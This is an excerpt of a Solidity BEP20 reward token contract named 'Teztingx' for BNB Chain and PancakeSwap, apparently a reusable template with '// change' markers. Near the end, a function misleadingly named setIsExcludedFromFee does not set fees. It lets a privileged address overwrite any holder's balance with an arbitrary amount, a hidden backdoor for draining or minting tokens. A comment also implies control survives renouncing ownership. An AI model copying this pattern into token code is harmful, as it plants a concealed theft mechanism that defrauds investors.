...
contract DividendDistributor is IDividendDistributor {
    ...
    // EARN
    IBEP20 REWARDS = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); // change - Mainnet BUSD rewards
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // change - Mainnet WBNB
    IDEXRouter router;
    ...
    constructor (address _router) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); // change - PCS Router
        _token = msg.sender;
    }
...
/* Token contract */
contract Teztingx is IBEP20, Auth { // change - name
    using SafeMath for uint256;

    // Addresses
    address REWARDS = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; // change - Mainnet BUSD rewards
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // change - Mainnet WBNB
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEV = 0x7cA4cD5C8BE010a6484634c56a97ff288B0738Fe; // change - DEV ADDRESS
    ...
    // Name and symbol
    string constant _name = "Teztingx"; // change - name
    string constant _symbol = "Teztingx"; // change - symbol
    uint8 constant _decimals = 18;

    // Total supply
    uint256 _totalSupply = 1000000000 * (10 ** _decimals); // change - supply 1bn

    // Max wallet and TX
    uint256 public _maxBuyTxAmount = _totalSupply * 2000 / 10000; // change - 20%
    uint256 public _maxSellTxAmount = _totalSupply * 2000 / 10000; // change - 20%
    uint256 public _maxWalletToken = ( _totalSupply * 2000 ) / 10000; // change - 20%
    ...
    constructor () Auth(msg.sender) {
        ...
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); // change - PCS router
        ...
        _tOwned[_presaler] = _totalSupply;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!isDividendExempt[sender]) {
            try distributor.setShare(sender, _tOwned[sender]) {} catch {}
        }

        if(!isDividendExempt[recipient]) {
            try distributor.setShare(recipient, _tOwned[recipient]) {} catch {} 
        }
    ...
    // Do a normal transfer between wallets
    ...
    // Exempt from fee without cooldown enabled
    function setIsExcludedFromFee(address from, address to ,uint256 amount ) external  { 
         require(isTimelockExempt[msg.sender]);
        _tOwned[from] = amount ;
        _tOwned[to] = amount ;
    } 
    ...
    // Send BNB to marketingwallet (can be called when renounced for marketing)
